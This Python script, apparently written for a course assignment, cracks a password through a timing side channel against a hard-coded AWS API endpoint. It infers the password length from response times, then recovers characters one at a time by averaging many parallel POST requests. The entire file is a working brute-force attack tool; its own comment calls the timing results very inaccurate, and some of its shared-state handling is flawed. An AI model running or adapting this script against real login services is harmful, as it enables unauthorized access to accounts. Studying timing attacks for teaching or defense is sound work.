import requests   
import json 
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, wait, ALL_COMPLETED 
from multiprocessing import Value
from ctypes import c_bool, c_float, c_wchar_p
from string import ascii_lowercase, digits 
import sys

current_max_time = None 
character_cracked = None 
password_cracked = None 
last_cracked_character = None 

class TimeAttacker:
    def __init__(self, attack_params):
        self.host = attack_params['url']
        self.alphabet = attack_params['alphabet']
        self.max_password_length = attack_params['max_password_length']
        self.min_password_length = attack_params['min_password_length']
        self.correct_first_substrings_by_len = {}
        self.password_cracked = False   

    def set_global(self, character_cracked_init_arg, current_max_time_init_arg, password_cracked_init_arg, last_cracked_character_init_arg):
        global character_cracked, current_max_time, password_cracked, last_cracked_character
        character_cracked = character_cracked_init_arg
        current_max_time = current_max_time_init_arg
        password_cracked = password_cracked_init_arg
        last_cracked_character = last_cracked_character_init_arg

    def guess_password_repeated(self, pwd, repeat=50):  
        global character_cracked, current_max_time, password_cracked, last_cracked_character
        if (not character_cracked or not password_cracked) or (not character_cracked.value and not password_cracked.value):
            total_time = 0  
            print(f'Guessing password "{pwd}" of len {len(pwd)} - {repeat} times -- avg_time=', end='')
            # threading makes the timing way too wonky. very inaccurate results
            with ThreadPoolExecutor(max_workers=2) as executor:
                futures = [executor.submit(self.guess_password, pwd) for _ in range(repeat)]
            for f in wait(futures, return_when=ALL_COMPLETED).done:
                total_time += f.result()  
            avg_time = total_time / repeat  
            print(f'{avg_time} microsec')  
            if current_max_time.value > 0 and (avg_time > (current_max_time.value + 30000) or (avg_time < (current_max_time.value - 30000))): # significantly higher or lower
                character_cracked.value = True    
                try:
                    last_cracked_character.value = pwd[pwd.index('-')-1]
                except ValueError:
                    last_cracked_character.value = pwd[-1] 
            if avg_time > current_max_time.value:
                current_max_time.value = avg_time
            return avg_time
        else:
            print(f'Skipping, last character cracked ({last_cracked_character.value})')
            return 0

    def guess_password(self, pwd):  
        global password_cracked
        d = {'pwd': pwd}   
        response = requests.post(url=self.host, data=json.dumps(d))    
        response_time = response.elapsed.microseconds
        if response.status_code == 200:
            print(f'Correct password found: {pwd}')
            password_cracked = True 
            sys.exit(0)
        return response_time 

    def get_next_letter(self, already_cracked, padding_length): 
        print(f'get_next_letter({already_cracked}, {padding_length})')
        # response_times_by_character = {k: 0 for k in self.alphabet} 
        character_cracked = Value(c_bool, False, lock=True)
        current_max_time = Value(c_float, 0.0, lock=True)
        password_cracked = Value(c_bool, False, lock=True)
        last_cracked_character = Value(c_wchar_p, '', lock=True) 
        with ProcessPoolExecutor(max_workers=6, initializer=self.set_global, 
            initargs=(character_cracked, current_max_time, password_cracked, last_cracked_character,)) as executor: 
            futures = {executor.submit(
                self.guess_password_repeated, 
                already_cracked + char + '-' * padding_length): char for char in self.alphabet}
            wait(futures, return_when=ALL_COMPLETED)
            # for future in wait(futures, return_when=ALL_COMPLETED).done: 
            #     char = futures[future]
            #     response_time = future.result() 
            #     response_times_by_character[char] += response_time  
        #_sorted = sorted(response_times_by_character, key=response_times_by_character.get, reverse=True)
        #print(f'_sorted = {_sorted}')
        #return _sorted[0]
        print(f'last cracked = {last_cracked_character.value}')
        return str(last_cracked_character.value)

    def get_correct_length(self):
        """ use nothing but padding for the password request at varying lengths within expected bounds
        maximum average response time indicates correct length """ 
        print(f'Getting correct length...')
        times = {}
        character_cracked = Value(c_bool, False, lock=True)
        current_max_time = Value(c_float, 0.0, lock=True)
        password_cracked = Value(c_bool, False, lock=True)
        last_cracked_character = Value(c_wchar_p, '', lock=True) 
        with ProcessPoolExecutor(max_workers=6, initializer=self.set_global, initargs=(character_cracked, current_max_time, password_cracked, last_cracked_character)) as executor: 
            futures = {executor.submit(
                self.guess_password_repeated, "-" * length ): length for length in range(self.min_password_length, self.max_password_length + 1)}
            for future in wait(futures, return_when=ALL_COMPLETED).done: 
                length = futures[future]
                response_time = future.result() 
                times[length] = response_time 
        _sorted = sorted(times, key=times.get, reverse=True)
        print(f'_sorted = {_sorted}')
        return _sorted[0]

    def attack(self): 
        correct_length = self.get_correct_length()
        print(f'Correct length appears to be {correct_length}. Guessing passwords of this length.')  
        padding_length = correct_length - 1
        cracked_letters = ''
        for _ in range(padding_length): 
            cracked_letters += self.get_next_letter(
                already_cracked=cracked_letters, 
                padding_length=padding_length)
            padding_length -= 1 
        cracked_letters += self.get_next_letter(
                already_cracked=cracked_letters, 
                padding_length=0)
        print(cracked_letters) 

if __name__ == "__main__": 
        
    REAL_HOST = "https://qrxjmztf2h.execute-api.us-west-2.amazonaws.com/prod"
    DEMO_HOST = "https://qrxjmztf2h.execute-api.us-west-2.amazonaws.com/prod/example"
    attack_params = {
        'demo': {
            'url': DEMO_HOST,
            'max_password_length': 12,
            'min_password_length': 11,
            'alphabet': digits + ascii_lowercase
        },
        'assignment': {
            'url': REAL_HOST,
            'max_password_length': 13,
            'min_password_length': 11,
            'alphabet': digits  
        }
    }
    demo_attacker = TimeAttacker(attack_params=attack_params['demo'])   
    demo_attacker.attack() 